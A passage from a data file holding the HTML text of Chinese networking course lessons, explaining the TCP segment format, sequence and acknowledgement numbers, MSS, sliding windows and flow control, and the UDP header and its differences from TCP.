data-nodeid="1396"><img src="https://s0.lgstatic.com/i/image6/M01/3A/3C/Cgp9HWB-m0mARV-VAAZgGUE4aeU706.png" alt="Drawing 7.png" data-nodeid="1548"></p>\n<p data-nodeid="1397">我们可以看到，TCP 的很多配置选项和数据粘在了一起，作为一个 TCP 段。</p>\n<p data-nodeid="1398">显然，让你把每一部分都记住似乎不太现实，但是我会带你把其中最主要的部分理解。<strong data-nodeid="1555">TCP 协议就是依靠每一个 TCP 段工作的，所以你每认识一个 TCP 的能力，几乎都会找到在 TCP Segment 中与之对应的字段</strong>。接下来我先带你认识下它们。</p>\n<ol data-nodeid="1399">\n<li data-nodeid="1400">\n<p data-nodeid="1401">Source Port/Destination Port 描述的是发送端口号和目标端口号，代表发送数据的应用程序和接收数据的应用程序。比如 80 往往代表 HTTP 服务，22 往往是 SSH 服务……</p>\n</li>\n<li data-nodeid="1402">\n<p data-nodeid="1403">Sequence Number 和 Achnowledgment Number 是保证可靠性的两个关键。具体见下文的讨论。</p>\n</li>\n<li data-nodeid="1404">\n<p data-nodeid="1405">Data Offset 是一个偏移量。这个量存在的原因是 TCP Header 部分的长度是可变的，因此需要一个数值来描述数据从哪个字节开始。</p>\n</li>\n<li data-nodeid="1406">\n<p data-nodeid="1407">Reserved 是很多协议设计会保留的一个区域，用于日后扩展能力。</p>\n</li>\n<li data-nodeid="1408">\n<p data-nodeid="1409">URG/ACK/PSH/RST/SYN/FIN 是几个标志位，用于描述 TCP 段的行为。也就是一个 TCP 封包到底是做什么用的？</p>\n</li>\n</ol>\n<p data-nodeid="1410">1）URG 代表这是一个紧急数据，比如远程操作的时候，用户按下了 Ctrl+C，要求终止程序，这种请求需要紧急处理。</p>\n<p data-nodeid="1411">2）ACK 代表响应，我们在“<a href="https://kaiwu.lagou.com/course/courseInfo.htm?courseId=837#/detail/pc?id=7266&amp;fileGuid=xxQTRXtVcqtHK6j8" data-nodeid="1567">02 | 传输层协议 TCP：TCP 为什么握手是 3 次、挥手是 4 次？</a>”讲到过，所有的消息都必须有 ACK，这是 TCP 协议确保稳定性的一环。</p>\n<p data-nodeid="1412">3）PSH 代表数据推送，也就是在传输数据的意思。</p>\n<p data-nodeid="1413">4）SYN 同步请求，也就是申请握手。</p>\n<p data-nodeid="1414">5）FIN 终止请求，也就是挥手。</p>\n<p data-nodeid="1415"><strong data-nodeid="1576">特别说明一下：以上这 5 个标志位，每个占了一个比特，可以混合使用。比如 ACK 和 SYN 同时为 1，代表同步请求和响应被合并了。这也是 TCP 协议，为什么是三次握手的原因之一</strong>。</p>\n<p data-nodeid="1416">6） Window 也是 TCP 保证稳定性并进行流量控制的工具，我们会在“<a href="https://kaiwu.lagou.com/course/courseInfo.htm?courseId=837#/detail/pc?id=7268" data-nodeid="1582">04 | TCP 的稳定性：滑动窗口和流速控制是怎么回事？</a>”中详细介绍。</p>\n<p data-nodeid="1417">7）Checksum 是校验和，用于校验 TCP 段有没有损坏。</p>\n<p data-nodeid="1418">8）Urgent Pointer 指向最后一个紧急数据的序号（Sequence Number）。它存在的原因是：有时候紧急数据是连续的很多个段，所以需要提前告诉接收方进行准备。</p>\n<p data-nodeid="5505" class="te-preview-highlight">9）Options 中存储了一些可选字段，比如接下来我们要讨论的 MSS（Maximun Segment Size）。<br>\n10）Padding 存在的意义是因为 Options 的长度不固定，需要 Pading 进行对齐。</p>\n\n\n\n<h3 data-nodeid="1420">Sequence Number 和 Acknowledgement Number</h3>\n<p data-nodeid="1421">在 TCP 协议的设计当中，数据被拆分成很多个部分，部分增加了协议头。合并成为一个 TCP 段，进行传输。这个过程，我们俗称<strong data-nodeid="1595">拆包</strong>。这些 TCP 段经过复杂的网络结构，由底层的 IP 协议，负责传输到目的地，然后再进行重组。</p>\n<p data-nodeid="1422">这里请你思考一个问题：稳定性要求数据无损地传输，也就是说拆包获得数据，又需要恢复到原来的样子。而在复杂的网络环境当中，即便所有的段是顺序发出的，也不能保证它们顺序到达，因此，发出的每一个 TCP 段都需要有序号。这个序号，就是 Sequence Number（Seq）。</p>\n<p data-nodeid="1423"><img src="https://s0.lgstatic.com/i/image6/M01/3A/3C/Cgp9HWB-m4CAaJ61AADgfscwtY8443.png" alt="Drawing 9.png" data-nodeid="1599"></p>\n<p data-nodeid="1424">如上图所示。发送数据的时候，为每一个 TCP 段分配一个自增的 Sequence Number。接收数据的时候，虽然得到的是乱序的 TCP 段，但是可以通过 Seq 进行排序。</p>\n<p data-nodeid="1425">但是这样又会产生一个新的问题——接收方如果要回复发送方，也需要这个 Seq。而网络的两个终端，去同步一个自增的序号是非常困难的。因为任何两个网络主体间，时间都不能做到完全同步，又没有公共的存储空间，无法共享数据，更别说实现一个分布式的自增序号了。</p>\n<p data-nodeid="1426">其实这个问题的本质就好像两个人在说话一样，我们要确保他们说出去的话，和回答之间的顺序。因为 TCP 是一个双工的协议，两边可能会同时说话。所以聪明的科学家想到了确定一句话的顺序，需要两个值去描述——<strong data-nodeid="1607">也就是发送的字节数和接收的字节数</strong>。</p>\n<p data-nodeid="1427"><img src="https://s0.lgstatic.com/i/image6/M01/3A/45/CioPOWB-m8WAN4r7AAG-F3w2k2k929.png" alt="Drawing 11.png" data-nodeid="1610"></p>\n<p data-nodeid="1428">我们重新定义一下 Seq（如上图所示），对于任何一个接收方，如果知道了发送者发送某个 TCP 段时，已经发送了多少字节的数据，那么就可以确定发送者发送数据的顺序。</p>\n<p data-nodeid="1429">但是这里有一个问题。如果接收方也向发送者发送了数据请求（或者说双方在对话），接收方就不知道发送者发送的数据到底对应哪一条自己发送的数据了。</p>\n<p data-nodeid="1430">举个例子：下面 A 和 B 的对话中，我们可以确定他们彼此之间接收数据的顺序。但是无法确定数据之间的关联关系，所以只有 Sequence Number 是不够的。</p>\n<pre class="lang-java" data-nodeid="1431"><code data-language="java">A：今天天气好吗？\nA：今天你开心吗？\nB：开心\nB：天气不好\n</code></pre>\n<p data-nodeid="1432">人类很容易理解这几句话的顺序，但是对于机器来说就需要特别的标注。因此我们还需要另一个数据，就是每个 TCP 段发送时，发送方已经接收了多少数据。用 Acknowledgement Number 表示，下面简写为 ACK。</p>\n<p data-nodeid="1433">下图中，终端发送了三条数据，并且接收到四条数据，通过观察，根据接收到的数据中的 Seq 和 ACK，将发送和接收的数据进行排序。</p>\n<p data-nodeid="1434"><img src="https://s0.lgstatic.com/i/image6/M01/3A/3D/Cgp9HWB-m82AUJiLAAHfbaP08JE788.png" alt="Drawing 13.png" data-nodeid="1618"></p>\n<p data-nodeid="1435">例如上图中，发送方发送了 100 字节的数据，而接收到的（Seq = 0 和 Seq =100）的两个封包，都是针对发送方（Seq = 0）这个封包的。发送 100 个字节，所以接收到的 ACK 刚好是 100。说明（Seq= 0 和 Seq= 100）这两个封包是针对接收到第 100 个字节数据后，发送回来的。这样就确定了整体的顺序。</p>\n<p data-nodeid="1436"><strong data-nodeid="1631">注意，无论 S<b><strong data-nodeid="1630">eq</strong></b> 还是 ACK，都是针对“对方”而言的。是对方发送的数据和对方接收到的数据</strong>。我们在实际的工作当中，可以通过 Whireshark 调试工具观察两个 TCP 连接的 Seq和 ACK。</p>\n<p data-nodeid="1437">具体的使用方法，我会在“09 | TCP 实战：如何进行 TCP 抓包调试？"中和你讨论。</p>\n<p data-nodeid="1438"><img src="https://s0.lgstatic.com/i/image6/M01/3A/3D/Cgp9HWB-m9WAO8jwAAUDwhNzXjU379.png" alt="Drawing 15.png" data-nodeid="1639"></p>\n<h3 data-nodeid="3780" class="">MSS（Maximun Segment Size）</h3>\n\n\n\n\n<p data-nodeid="1440">接下来，我们讨论下 MSS，它也是面试经常会问到的一个 TCP Header 中的可选项（Options），这个可选项控制了 TCP 段的大小，它是一个协商字段（Negotiate）。协议是双方都要遵循的标准，因此配置往往不能由单方决定，需要双方协商。</p>\n<p data-nodeid="1441">TCP 段的大小（MSS）涉及发送、接收缓冲区的大小设置，双方实际发送接收封包的大小，对拆包和粘包的过程有指导作用，因此需要双方去协商。</p>\n<p data-nodeid="1442">如果这个字段设置得非常大，就会带来一些影响。</p>\n<p data-nodeid="1443">首先对方可能会拒绝，作为服务的提供方，你可能不会愿意接收太大的 TCP 段。<strong data-nodeid="1653">因为大的 TCP 段，会降低性能，比如内存使用的性能</strong>。具体你可以参考<a href="https://shenceyun.lagou.com/t/Axo?fileGuid=xxQTRXtVcqtHK6j8" data-nodeid="1651">《重学操作系统》</a>课程中关于页表的讨论。</p>\n<ul data-nodeid="1444">\n<li data-nodeid="1445">\n<p data-nodeid="1446"><a href="https://kaiwu.lagou.com/course/courseInfo.htm?courseId=478#/detail/pc?id=4633&amp;fileGuid=xxQTRXtVcqtHK6j8" data-nodeid="1658">24 | 虚拟内存 ：一个程序最多能使用多少内存？</a></p>\n</li>\n<li data-nodeid="1447">\n<p data-nodeid="1448"><a href="https://kaiwu.lagou.com/course/courseInfo.htm?courseId=478#/detail/pc?id=4634&amp;fileGuid=xxQTRXtVcqtHK6j8" data-nodeid="1663">25 | 内存管理单元： 什么情况下使用大内存分页？</a></p>\n</li>\n<li data-nodeid="1449">\n<p data-nodeid="1450"><a href="https://kaiwu.lagou.com/course/courseInfo.htm?courseId=478#/detail/pc?id=4635&amp;fileGuid=xxQTRXtVcqtHK6j8" data-nodeid="1668">26 | 缓存置换算法： LRU 用什么数据结构实现更合理？</a></p>\n</li>\n</ul>\n<p data-nodeid="1451">还有就是<strong data-nodeid="1674">资源的占用</strong>。一个用户占用服务器太多的资源，意味着其他的用户就需要等待或者降低他们的服务质量。</p>\n<p data-nodeid="1452"><strong data-nodeid="1679">其次，支持 TCP 协议工作的 IP 协议，工作效率会下降</strong>。TCP 协议不肯拆包，IP 协议就需要拆出大量的包。那么 IP 协议为什么需要拆包呢？这是因为在网络中，每次能够传输的数据不可能太大，这受限于具体的网络传输设备，也就是物理特性。但是 IP 协议，拆分太多的封包并没有意义。因为可能会导致属于同个 TCP 段的封包被不同的网络路线传输，这会加大延迟。同时，拆包，还需要消耗硬件和计算资源。</p>\n<p data-nodeid="1453">那是不是 MSS 越小越好呢？MSS 太小的情况下，会浪费传输资源（降低吞吐量）。因为数据被拆分之后，每一份数据都要增加一个头部。如果 MSS 太小，那头部的数据占比会上升，这让吞吐量成为一个灾难。<strong data-nodeid="1685">所以在使用的过程当中，MSS 的配置，往往都是一个折中的方案</strong>。而根据 Unix 的哲学，不要去猜想什么样的方案是最合理的，而是要尝试去用实验证明它，一切都要用实验依据说话。</p>\n<h3 data-nodeid="1454">总结</h3>\n<p data-nodeid="1455">TCP 协议的设计像一台巨大而严密的机器，每次我重新温习 TCP 协议，都会感叹“它庞大，而且很琐碎”。每一个细节的设计，都有很深的思考。比如 Sequence Number 和 Acknowledge Number 的设计，就非常巧妙地利用发送字节数和接收字节数解决了顺序的问题。</p>\n<p data-nodeid="1456">那么现在你可以尝试来回答本讲关联的面试题目：<strong data-nodeid="1693">TCP 协议是如何恢复数据的顺序的，TCP 拆包和粘包的作用是什么</strong>？</p>\n<p data-nodeid="1457">【<strong data-nodeid="1705">解析</strong>】TCP 拆包的作用是将任务拆分处理，降低整体任务出错的概率，以及减小底层网络处理的压力。拆包过程需要保证数据经过网络的传输，又能恢复到原始的顺序。这中间，需要数学提供保证顺序的理论依据。TCP 利用（发送字节数、接收字节数）的唯一性来确定封包之间的顺序关系。具体的算法，我们会在下一讲“<a href="https://kaiwu.lagou.com/course/courseInfo.htm?courseId=837#/detail/pc?id=7268" data-nodeid="1703">04 | TCP 的稳定性解决方案 ：滑动窗口和流量控制是怎么回事？</a>”中给出。粘包是为了防止数据量过小，导致大量的传输，而将多个 TCP 段合并成一个发送。</p>\n<h3 data-nodeid="1458">思考题</h3>\n<p data-nodeid="1459"><strong data-nodeid="1711">最后再给你留一道练习查资料的思考题：有哪些好用的压测工具</strong>？</p>\n<p data-nodeid="1460">可以把你的答案、思路或者课后总结写在留言区，这个输出的过程不仅能够帮助你产生更多的思考，也是构建知识体系的根基，只有内容输出了，才会形成自己的观点。经过长期的积累，相信你会得到意想不到的收获。如果你觉得今天的内容对你有所启发，记得分享给身边的朋友。期待看到你的思考！</p>\n<p data-nodeid="1461" class="">这一讲就到这里，发现求知的乐趣，我是林䭽。感谢你学习本次课程，下一讲我们将学习“04 | TCP 的稳定性：滑动窗口和流速控制是怎么回事？”。再见！</p>',
        article_title: "03 | TCP 的封包格式：TCP 为什么要粘包和拆包？",
        title: "03 | TCP 的封包格式：TCP 为什么要粘包和拆包？",
        id: 7267,
      },
      {
        content:
          '<p data-nodeid="26040" class="">上一讲我们提到，TCP 利用发送字节数和接收字节数，这个二元组的唯一性保证顺序。今天我们继续“03 | TCP 的封包格式：TCP 为什么要粘包和拆包？”的话题，讨论下保证顺序的具体算法，以及如何在保证顺序的基础上，同时追求更高的吞吐量。我认为，这部分知识也是 TCP 协议中最有趣的部分——TCP 的滑动窗口算法。</p>\n<p data-nodeid="26041"><strong data-nodeid="26110">TCP 作为一个传输层协议，最核心的能力是传输。传输需要保证可靠性，还需要控制流速，这两个核心能力均由滑动窗口提供</strong>。而滑动窗口中解决的问题，是你在今后的工作中可以长期使用的，比如设计一个分布式的 RPC 框架、实现一个消息队列或者分布式的文件系统等。</p>\n<p data-nodeid="26042">所以请你带着今天的问题“<strong data-nodeid="26116">滑动窗口和流速控制是怎么回事？</strong>”开始今天的学习吧！</p>\n<h3 data-nodeid="26043">请求/响应模型</h3>\n<p data-nodeid="26044">TCP 中每个发送的请求都需要响应。如果一个请求没有收到响应，发送方就会认为这次发送出现了故障，会触发重发。</p>\n<p data-nodeid="26045">大体的模型，和下图很像。但是如果完全和下图一样，每一个请求收到响应之后，再发送下一个请求，吞吐量会很低。因为这样的设计，会产生网络的空闲时间，说白了，就是浪费带宽。带宽没有用满，意味着可以同时发送更多的请求，接收更多的响应。</p>\n<p data-nodeid="26046"><img src="https://s0.lgstatic.com/i/image6/M00/3A/FA/CioPOWCCKu-AJ2NHAACe0M3wDME839.png" alt="image (1).png" data-nodeid="26122"></p>\n<div data-nodeid="26047"><p style="text-align:center">TCP 请求/响应模型（吞吐量低）</p></div>\n<p data-nodeid="26048">一种改进的方式，就是让发送方有请求就发送出去，而不是等待响应。通过这样的处理方式，发送的数据连在了一起，响应的数据也连在了一起，吞吐量就提升了。</p>\n<p data-nodeid="26049"><img src="https://s0.lgstatic.com/i/image6/M00/3A/F2/Cgp9HWCCKvWAKGcEAACep0GQbI0182.png" alt="image (2).png" data-nodeid="26126"></p>\n<p data-nodeid="26050">但是如果可以同时发送的数据真的非常多呢？比如成百上千个 TCP 段都需要发送，这个时候带宽可能会不足。像下图这样，很多个数据封包都需要发送，该如何处理呢？</p>\n<p data-nodeid="26051"><img src="https://s0.lgstatic.com/i/image6/M01/3A/67/CioPOWB_iSGAJrYTAAA1X0Gw-4U285.png" alt="Drawing 2.png" data-nodeid="26130"></p>\n<h4 data-nodeid="26052">排队（Queuing）</h4>\n<p data-nodeid="26053">在这种情况下，通常我们会考虑<strong data-nodeid="26137">排队（Queuing）机制</strong>。</p>\n<p data-nodeid="26054"><img src="https://s0.lgstatic.com/i/image6/M00/3A/FA/CioPOWCCKwuAfBn5AABKdgtX54w997.png" alt="image (3).png" data-nodeid="26140"></p>\n<p data-nodeid="26055">考虑这样一个模型，如上图所示，在 TCP 层实现一个队列。新元素从队列的一端（左侧）排队，作为一个未发送的数据封包。开始发送的数据封包，从队列的右侧离开。你可以思考一下，这个模型有什么问题吗？</p>\n<p data-nodeid="26056">这样做就需要多个队列，我们要将未发送的数据从队列中取出，加入发送中的队列。然后再将发送中的数据，收到 ACK 的部分取出，放入已接收的队列。而发送中的封包，何时收到 ACK 是一件不确定的事情，这样使用队列似乎也有一定的问题。</p>\n<h3 data-nodeid="26057">滑动窗口（Sliding Window）</h3>\n<p data-nodeid="26058">在上面的模型当中，我们之所以觉得算法不好设计，是因为用错了数据结构。有个说法叫作如果程序写复杂了，那就是写错了。这里其实应该用一种叫作<strong data-nodeid="26149">滑动窗口的数据结构</strong>去实现。</p>\n<p data-nodeid="26059"><img src="https://s0.lgstatic.com/i/image6/M00/3A/F2/Cgp9HWCCKxSAROSpAAA_zThgiBA669.png" alt="image (4).png" data-nodeid="26152"></p>\n<p data-nodeid="26060">如上图所示：</p>\n<ul data-nodeid="26061">\n<li data-nodeid="26062">\n<p data-nodeid="26063">深绿色代表已经收到 ACK 的段</p>\n</li>\n<li data-nodeid="26064">\n<p data-nodeid="26065">浅绿色代表发送了，但是没有收到 ACK 的段</p>\n</li>\n<li data-nodeid="26066">\n<p data-nodeid="26067">白色代表没有发送的段</p>\n</li>\n<li data-nodeid="26068">\n<p data-nodeid="26069">紫色代表暂时不能发送的段</p>\n</li>\n</ul>\n<p data-nodeid="26070">下面我们重新设计一下不同类型封包的顺序，将已发送的数据放到最左边，发送中的数据放到中间，未发送的数据放到右边。假设我们最多同时发送 5 个封包，也就是窗口大小 = 5。窗口中的数据被同时发送出去，然后等待 ACK。如果一个封包 ACK 到达，我们就将它标记为已接收（深绿色）。</p>\n<p data-nodeid="26071">如下图所示，有两个封包的 ACK 到达，因此标记为绿色。</p>\n<p data-nodeid="26072"><img src="https://s0.lgstatic.com/i/image6/M00/3A/F2/Cgp9HWCCKxuAeVUyAAA_sW29BSM139.png" alt="image (5).png" data-nodeid="26162"></p>\n<p data-nodeid="26073">这个时候滑动窗口可以向右滑动，如下图所示：</p>\n<p data-nodeid="26074"><img src="https://s0.lgstatic.com/i/image6/M00/3A/FA/CioPOWCCKyCAMaA7AAA_zxqi_ig808.png" alt="image (6).png" data-nodeid="26166"></p>\n<h4 data-nodeid="26075">重传</h4>\n<p data-nodeid="26076">如果发送过程中，部分数据没能收到 ACK 会怎样呢？这就可能发生重传。</p>\n<p data-nodeid="26077">如果发生下图这样的情况，段 4 迟迟没有收到 ACK。</p>\n<p data-nodeid="26078"><img src="https://s0.lgstatic.com/i/image6/M00/3A/F2/Cgp9HWCCKyaAcZwMAABGuK2lrZY271.png" alt="image (7).png" data-nodeid="26172"></p>\n<p data-nodeid="26079">这个时候滑动窗口只能右移一个位置，如下图所示：</p>\n<p data-nodeid="26080"><img src="https://s0.lgstatic.com/i/image6/M00/3A/FA/CioPOWCCKyuADL6mAABGoEBZ_2Y287.png" alt="image (8).png" data-nodeid="26176"></p>\n<p data-nodeid="26081">在这个过程中，如果后来段 4 重传成功（接收到 ACK），那么窗口就会继续右移。如果段 4 发送失败，还是没能收到 ACK，那么接收方也会抛弃段 5、段 6、段 7。这样从段 4 开始之后的数据都需要重发。</p>\n<h4 data-nodeid="26082">快速重传</h4>\n<p data-nodeid="26083">在 TCP 协议中，如果接收方想丢弃某个段，可以选择不发 ACK。发送端超时后，会重发这个 TCP 段。而有时候，接收方希望催促发送方尽快补发某个 TCP 段，这个时候可以使用<strong data-nodeid="26184">快速重传</strong>能力。</p>\n<p data-nodeid="26084">例如段 1、段 2、段 4 到了，但是段 3 没有到。 接收方可以发送多次段 3 的 ACK。如果发送方收到多个段 3 的 ACK，就会重发段 3。这个机制称为<strong data-nodeid="26190">快速重传</strong>。这和超时重发不同，是一种催促的机制。</p>\n<p data-nodeid="26085">为了不让发送方误以为段 3 已经收到了，在快速重传的情况下，接收方即便收到发来的段 4，依然会发段 3 的 ACK（不发段 4 的 ACK），直到发送方把段 3 重传。</p>\n<h4 data-nodeid="26086">思考：窗口大小的单位是？</h4>\n<p data-nodeid="26087">请你思考另一个问题，窗口大小的单位是多少呢？在上面所有的图片中，窗口大小是 TCP 段的数量。<strong data-nodeid="26198">实际操作中，每个 TCP 段的大小不同，限制数量会让接收方的缓冲区不好操作，因此实际操作中窗口大小单位是字节数</strong>。</p>\n<h3 data-nodeid="26088">流速控制</h3>\n<p data-nodeid="26089"><strong data-nodeid="26204">发送、接收窗口的大小可以用来控制 TCP 协议的流速</strong>。窗口越大，同时可以发送、接收的数据就越多，支持的吞吐量也就越大。当然，窗口越大，如果数据发生错误，损失也就越大，因为需要重传越多的数据。</p>\n<p data-nodeid="26090">举个例子：我们用 RTT 表示 Round Trip Time，就是消息一去一回的时间。</p>\n<p data-nodeid="26091">假设 RTT = 1ms，带宽是 1mb/s。如果窗口大小为 1kb，那么 1ms 可以发送一个 1kb 的数据（含 TCP 头），1s 就可以发送 1mb 的数据，刚好可以将带宽用满。如果 RTT 再慢一些，比如 RTT = 10ms，那么这样的设计就只能用完 1/10 的带宽。 当然你可以提高窗口大小提高吞吐量，但是实际的模型会比这个复杂，因为还存在重传、快速重传、丢包等因素。</p>\n<p data-nodeid="26092">而实际操作中，也不可以真的把带宽用完，所以最终我们会使用折中的方案，在延迟、丢包率、吞吐量中进行选择，毕竟鱼和熊掌不可兼得。</p>\n<h3 data-nodeid="26093">总结</h3>\n<p data-nodeid="26094">为了提高传输速率，TCP 协议选择将多个段同时发送，为了让这些段不至于被接收方拒绝服务，在发送前，双方要协商好发送的速率。但是我们不可能完全确定网速，所以协商的方式，就变成确定窗口大小。</p>\n<p data-nodeid="26095">有了窗口，发送方利用滑动窗口算法发送消息；接收方构造缓冲区接收消息，并给发送方 ACK。滑动窗口的实现只需要数组和少量的指针即可，是一个非常高效的算法。像这种算法，简单又实用，比如求一个数组中最大的连续 k 项和，就可以使用滑动窗口算法。如果你对这个问题感兴趣，不妨用你最熟悉的语言尝试解决一下。</p>\n<p data-nodeid="26096">那么，现在你可以尝试来回答本讲关联的面试题目：<strong data-nodeid="26216">滑动窗口和流速控制是怎么回事</strong>？</p>\n<p data-nodeid="26097">【<strong data-nodeid="26226">解析</strong>】<strong data-nodeid="26227">滑动窗口是 TCP 协议控制可靠性的核心</strong>。发送方将数据拆包，变成多个分组。然后将数据放入一个拥有滑动窗口的数组，依次发出，仍然遵循先入先出（FIFO）的顺序，但是窗口中的分组会一次性发送。窗口中序号最小的分组如果收到 ACK，窗口就会发生滑动；如果最小序号的分组长时间没有收到 ACK，就会触发整个窗口的数据重新发送。</p>\n<p data-nodeid="26098">另一方面，在多次传输中，网络的平均延迟往往是相对固定的，这样 TCP 协议可以通过双方协商窗口大小控制流速。补充下，上面我们说的分组和 TCP 段是一个意思。</p>\n<h3 data-nodeid="26099">思考题</h3>\n<p data-nodeid="26100"><strong data-nodeid="26234">最后，再给你出一道思考题：既然发送方有窗口，那么接收方也需要有窗口吗</strong>？</p>\n<p data-nodeid="26101">我建议你不要查资料，可以把你的想法写在留言区，我们一起讨论。如果你觉得今天的内容对你有所启发，欢迎分享给身边的朋友。期待看到你的思考！</p>\n<p data-nodeid="27445" class="te-preview-highlight">这一讲就到这里，发现求知的乐趣，我是林䭽，感谢你学习本次课程，下一讲我们将学习“05&nbsp; | UDP 协议： TCP 协议和 UDP 协议的优势和劣势？”。</p>',
        article_title: "04 | TCP 的稳定性：滑动窗口和流速控制是怎么回事？",
        title: "04 | TCP 的稳定性：滑动窗口和流速控制是怎么回事？",
        id: 7268,
      },
      {
        content:
          '<p data-nodeid="1029" class="">之前我们在“<a href="https://kaiwu.lagou.com/course/courseInfo.htm?courseId=837#/detail/pc?id=7266&amp;fileGuid=xxQTRXtVcqtHK6j8" data-nodeid="1126">02 | 传输层协议 TCP ： TCP 为什么握手是 3 次、挥手是 4 次？</a>”提到过，TCP 和 UDP 是今天应用最广泛的传输层协议，拥有最核心的垄断地位。<strong data-nodeid="1132">TCP 最核心的价值是提供了可靠性，而 UDP 最核心的价值是灵活，你几乎可以用它来做任何事情</strong>。例如：HTTP 协议 1.1 和 2.0 都基于 TCP，而到了 HTTP 3.0 就开始用 UDP 了。</p>\n<p data-nodeid="1813" class="te-preview-highlight">如果你打开 <a href="https://tools.ietf.org/html/rfc793?fileGuid=xxQTRXtVcqtHK6j8" data-nodeid="1817">TCP 协议的 RFC</a><a href="https://tools.ietf.org/html/rfc793?fileGuid=xxQTRXtVcqtHK6j8" data-nodeid="1820">文档</a>，可以看到目录中一共有 85 页；如果你打开 <a href="https://tools.ietf.org/html/rfc768?fileGuid=xxQTRXtVcqtHK6j8" data-nodeid="1824">UDP 的 RFC 文档</a>，会看到目录中只有 3 页。一个只有 3 页的协议，能够成为今天最主流的传输层协议之一，那么它一定有非常值得我们学习的地方。</p>\n\n\n<p data-nodeid="1031">UDP 在数据传输、网络控制、音视频、Web 技术中，都有很重要的地位，因此它也是面试常考的内容。设计系统时候，UDP 经常拿来和 TCP 比较。这一讲，就以 TCP 协议和 UDP 协议的优势和劣势为引，开启我们今天的学习。</p>\n<h3 data-nodeid="1032">UDP 协议</h3>\n<p data-nodeid="1033"><strong data-nodeid="1151">UDP（User Datagram Protocol），目标是在传输层提供直接发送报文（Datagram）的能力</strong>。Datagram 是数据传输的最小单位。UDP 协议不会帮助拆分数据，它的目标只有一个，就是发送报文。</p>\n<p data-nodeid="1034">有细心的同学可能会问： 为什么不直接调用 IP 协议呢？ 如果裸发数据，IP 协议不香吗？</p>\n<p data-nodeid="1035">这是因为传输层协议在承接上方应用层的调用，需要提供应用到应用的通信——因此要附上端口号。每个端口，代表不同的应用。传输层下层的 IP 协议，承接传输层的调用，将数据从主机传输到主机。IP 层不能区分应用，导致哪怕是在 IP 协议上进行简单封装，也需要单独一个协议。这就构成了 UDP 协议的市场空间。</p>\n<h3 data-nodeid="1036">UDP 的封包格式</h3>\n<p data-nodeid="1037">UDP 的设计目标就是在允许用户直接发送报文的情况下，最大限度地简化应用的设计。下图是 UDP 的报文格式。</p>\n<p data-nodeid="1038"><img src="https://s0.lgstatic.com/i/image6/M01/3B/0F/Cgp9HWCCfQeAGOF3AACK2Gf5t6I606.png" alt="图片1.png" data-nodeid="1158"></p>\n<p data-nodeid="1039">你可以看到，UDP 的报文非常简化，只有 5 个部分。</p>\n<ul data-nodeid="1040">\n<li data-nodeid="1041">\n<p data-nodeid="1042">Source Port 是源端口号。因为 UDP 协议的特性（不需要 ACK），因此这个字段是可以省略的。但有时候对于防火墙、代理来说，Source Port 有很重要的意义，它们需要用这个字段行过滤和路由。</p>\n</li>\n<li data-nodeid="1043">\n<p data-nodeid="1044">Destination Port 是目标端口号（这个字段不可以省略）。</p>\n</li>\n<li data-nodeid="1045">\n<p data-nodeid="1046">Length 是消息体长度。</p>\n</li>\n<li data-nodeid="1047">\n<p data-nodeid="1048">Checksum 是校验和，作用是检查封包是否出错。</p>\n</li>\n<li data-nodeid="1049">\n<p data-nodeid="1050">Data octets 就是一个字节一个字节的数据，Octet 是 8 位。</p>\n</li>\n</ul>\n<p data-nodeid="1051">下面我们先简单聊聊校验和（Checksum）机制，这个机制在很多的网络协议中都会存在，因为校验数据在传输过程中有没有丢失、损坏是一个普遍需求。在一次网络会话中，我们传输的内容可能是：“你好！”，但事实上传输的是 01 组成的二进制。请你思考这样一个算法，我们把数据分成一个一个 byte，然后将所有 byte 相加，再将最终的结果取反。</p>\n<p data-nodeid="1052">比如现在数据有 4 个 byte：a,b,c,d，那么一种最简单的校验和就是：</p>\n<pre class="lang-java" data-nodeid="1053"><code data-language="java">checksum=(a+b+c+d) ^ <span class="hljs-number">0xff</span>\n</code></pre>\n<p data-nodeid="1054"><strong data-nodeid="1175">如果发送方用上述方式计算出 Checksum，并将 a,b,c,d 和 Checksum 一起发送给接收方，接收方就可以用同样的算法再计算一遍，这样就可以确定数据有没有发生损坏</strong>（<strong data-nodeid="1176">变化</strong>）。当然 Checksum 的做法，只适用于数据发生少量变化的情况。如果数据发生较大的变动，校验和也可能发生碰撞。</p>\n<p data-nodeid="1055">你可以看到 UDP 的可靠性保证仅仅就是 Checksum 一种。如果一个数据封包 Datagram 发生了数据损坏，UDP 可以通过 Checksum 纠错或者修复。 但是 UDP 没有提供再多的任何机制，比如 ACK、顺序保证以及流控等。</p>\n<h3 data-nodeid="1056">UDP 与 TCP的区别</h3>\n<p data-nodeid="1057">接下来我们说说 UDP 和 TCP 的区别。</p>\n<h4 data-nodeid="1058">1. 目的差异</h4>\n<p data-nodeid="1059">首先，这两个协议的目的不同：TCP 协议的核心目标是提供可靠的网络传输，而 UDP 的目标是在提供报文交换能力基础上尽可能地简化协议轻装上阵。</p>\n<h4 data-nodeid="1060">2. 可靠性差异</h4>\n<p data-nodeid="1061">TCP 核心是要在保证可靠性提供更好的服务。TCP 会有握手的过程，需要建立连接，保证双方同时在线。而且TCP 有时间窗口持续收集无序的数据，直到这一批数据都可以合理地排序组成连续的结果。</p>\n<p data-nodeid="1062">UDP 并不具备以上这些特性，它只管发送数据封包，而且 UDP 不需要 ACK，这意味着消息发送出去成功与否 UDP 是不管的。</p>\n<h4 data-nodeid="1063">3. 连接 vs 无连接</h4>\n<p data-nodeid="1064">TCP 是一个面向连接的协议（Connection-oriented Protocol），传输数据必须先建立连接。 UDP 是一个无连接协议（Connection-less Protocol），数据随时都可以发送，只提供发送封包（Datagram）的能力。</p>\n<h4 data-nodeid="1065">4. 流控技术（Flow Control）</h4>\n<p data-nodeid="1066">TCP 使用了流控技术来确保发送方不会因为一次发送过多的数据包而使接收方不堪重负。TCP 在发送缓冲区中存储数据，并在接收缓冲区中接收数据。当应用程序准备就绪时，它将从接收缓冲区读取数据。如果接收缓冲区已满，接收方将无法处理更多数据，并将其丢弃。UDP 没有提供类似的能力。</p>\n<h4 data-nodeid="1067">5. 传输速度</h4>\n<p data-nodeid="1068">UDP 协议简化，封包小，没有连接、可靠性检查等，因此单纯从传输速度上讲，UDP 更快。</p>\n<h4 data-nodeid="1069">6. 场景差异</h4>\n<p data-nodeid="1070">TCP 每个数据封包都需要确认，因此天然不适应高速数据传输场景，比如观看视频（流媒体应用）、网络游戏（TCP 有延迟）等。具体来说，如果网络游戏用 TCP，每个封包都需要确认，可能会造成一定的延迟；再比如音、视频传输天生就允许一定的丢包率；Ping 和 